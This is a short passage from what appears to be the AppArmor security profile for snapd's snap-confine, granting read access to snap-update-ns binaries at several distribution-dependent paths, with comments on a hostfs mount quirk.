   621	    # different locations of snap mount directory across distributions.
   622	    /{,var/lib/snapd/}snap/{core,snapd}/*/usr/lib/snapd/snap-update-ns r,
   623	
   624	    # ...snap-confine is, conceptually, re-executing and uses snap-update-ns
   625	    # from the core snap or snapd snap, but we are already inside the
   626	    # constructed mount namespace. Here the apparmor kernel module
   627	    # re-constructs the path to snap-update-ns using the "hostfs" mount entry
   628	    # rather than the more "natural" /snap mount entry but we have no control
   629	    # over that.  This is reported as (LP: #1716339). The variants here
   630	    # represent different locations of snap mount directory across
   631	    # distributions.
   632	    /var/lib/snapd/hostfs/{,var/lib/snapd/}snap/{core,snapd}/*/usr/lib/snapd/snap-update-ns r,
